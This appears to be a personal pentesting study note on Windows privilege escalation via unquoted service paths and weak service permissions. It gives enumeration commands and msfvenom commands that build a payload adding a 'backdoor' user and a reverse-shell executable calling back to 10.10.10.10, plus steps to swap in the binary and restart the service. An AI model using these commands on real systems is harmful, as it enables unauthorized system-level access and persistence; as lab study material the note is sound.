#### Tags: [[06 - Privilege Escalation (TA0004)]] 

## Overview 

```markdown
```
## Enumeration 

### Script Enumeration

```markdown
# PowerUp Obfuscated > Play in memory & Script obfuscation
GitHub Fetch Scipt > Execute! 
```

### Manual Enumeration
```
##  WMI (Powershell) ##
PS:> 
Get-WmiObject win32_service | select Name,PathName,StartMode,StartName | where {$_.StartMode -ne "Disabled" -and $_.StartName -eq "LocalSystem" -and $_.PathName -notmatch "`"" -and $_.PathName -notmatch "C:\\Windows"} | Format-List

##  Windows Management Instrumentation Command-Line (WMIC)  ##
CMD:> 
wmic service get name,displayname,pathname,startmode |findstr /i "auto" |findstr /i /v "c:\windows\\" |findstr /i /v """
```

```markdown
# Identfy service with weak permissions or unquoted paths 
CMD:> .\accesschk64.exe /accepteula -uwcqv studentuser ***
PS:> Get-WmiObject -Class win32_service | select pathname
	+ Look out for Service with Spaces and not having Quotes!

# Manually Query Service 
CMD:> sc qc "service_name"
PS:> cmd /c sc qc "BOOTP Turbo"

# AccessCHK - Sysinternals
## Check Write access to Directory under Unquoted Service PATH
C:\PrivEsc\accesschk.exe /accepteula -wuqvd "C:\Program Files\Unquoted Path Service\"
RW BUILTIN\Users
	FILE_ALL_ACCESS
# ICACLS - Inbuilt binary

```

![[Pasted image 20240330234652.png]]
## Exploitation 
### Create Malicious Service
```markdown
# Add User Exploiation
msfvenom -p windows/adduser USER=backdoor PASS=backdoor -f exe > service.exe

# Reverse Shell Exploitation
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=53 -f exe -o reverse.exe
```
### Replace Service
### Start the service post modification of PATH
- Restart Service
	- `net stop <service>`
	- `net start <service>`
	or
	- `sc stop service_name
	- `sc start service_name`
- Restart Machine
	- ``

## Resources

```markdown
```

#### Notes | Bonus
- Create Links to this Page! 
